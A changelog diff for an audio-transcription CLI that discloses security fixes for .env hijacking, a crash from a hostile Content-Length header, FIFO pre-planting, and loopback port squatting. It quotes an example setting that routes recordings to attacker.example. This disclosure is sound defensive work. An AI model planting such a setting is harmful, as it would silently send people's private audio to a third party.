@@ -5,6 +5,17 @@ All notable changes to this project will be documented in this file.
 Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 Versioning: [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Fixed
+- **The working-directory `.env` is no longer a settings source.** Settings read both the per-user config and `./.env` (with the cwd file winning), so merely running `tapeback process sensitive.wav` from a downloaded repository containing `TAPEBACK_TRANSCRIPTION_BACKEND=lemonade` and `TAPEBACK_LEMONADE_URL=https://attacker.example` silently routed the raw recording to that URL — no repository code executed and nothing asked for confirmation. Only the fixed per-user config (`~/.config/tapeback/.env`) and explicit `TAPEBACK_*` environment variables are trusted now; **if you kept a `.env` in your working directory, move it to `~/.config/tapeback/.env`**.
+- **A hostile Lemonade `Content-Length` can no longer escape the error hierarchy.** `str.isdigit()` was treated as proof that `int()` is safe: a decimal string longer than CPython's integer-string conversion limit, or non-ASCII "digits" (e.g. superscripts), made `int()` raise `ValueError` outside the bounded unavailable/fallback behavior, crashing transcribe/status. The header is now parsed as bounded ASCII digits and anything else is a sanitized `LemonadeUnavailableError`.
+- **Predictable recording/staging targets can no longer be pre-planted with FIFOs or attacker-held regular files.** The filesystem guard refused symlinks but accepted every other pre-existing inode: in the permissive-directory scenario the 0700 repair targets, an attacker who planted `mic.wav` as a FIFO (or holds an open descriptor on a planted regular file) from before the chmod kept a live handle that `parecord` would stream microphone audio into, and a slow FIFO reader could stall the recording. Recording and staging outputs are now unlinked and re-created `O_CREAT|O_EXCL` mode 0600, so the writer opens a fresh inode only the current user could have created inside the secured directory.
+
+### Changed
+- **`faster-whisper` is the default transcription backend again; Lemonade is explicit opt-in.** The previous default sent raw recording audio to plaintext `http://127.0.0.1:13305` with an optional bearer token — on a multi-user host where the real server is absent, any unprivileged local process could bind the predictable port first and silently receive microphone/system audio, with plausible JSON making the capture look successful. Set `TAPEBACK_TRANSCRIPTION_BACKEND=lemonade` to opt in; the CLI's "local transcription" description now matches reality again.
+- **Lemonade's run disclosure flags unauthenticated plaintext loopback endpoints.** The backend line every run prints (pipeline and live mode) appends "(unauthenticated plaintext: any local listener on this port could receive the audio)" when the endpoint is `http://` on loopback and no API key is configured, so an opted-in user always sees when audio is headed to a port any local process could be listening on.
+
 ## [0.10.0] — 2026-09-01
 
 ### Added
